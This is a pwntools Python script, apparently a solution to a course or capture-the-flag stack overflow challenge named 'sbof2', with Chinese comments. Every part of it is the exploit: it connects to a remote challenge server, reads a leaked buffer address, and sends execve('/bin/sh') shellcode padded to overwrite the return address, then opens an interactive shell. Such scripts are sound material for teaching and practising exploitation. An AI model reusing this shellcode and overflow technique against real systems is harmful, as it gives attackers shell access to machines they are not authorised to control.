from pwn import *

context.arch = 'amd64'
context.log_level = 'DEBUG'

# 选择本地测试还是远程测试
LOCAL = False

if LOCAL:
    p = process('./sbof2')
else:
    p = remote('8.154.20.109', 10100)

# 使用一个 shellcode
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# 处理学生 ID 请求
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(b"3220103784")

# 接收程序输出的缓冲区地址
p.recvuntil(b"gift address: ")
buffer_addr = int(p.recvline().strip(), 16)

log.success(f"buffer address: {hex(buffer_addr)}")

# 构造 payload
payload = shellcode  # 首先放入 shellcode
payload += b"A" * (0x100 + 8 - len(shellcode))  # 填充剩余的缓冲区空间
payload += p64(buffer_addr)  # 覆盖返回地址为缓冲区的起始地址

# 发送 payload
p.sendline(payload)

# 获取shell
p.interactive()
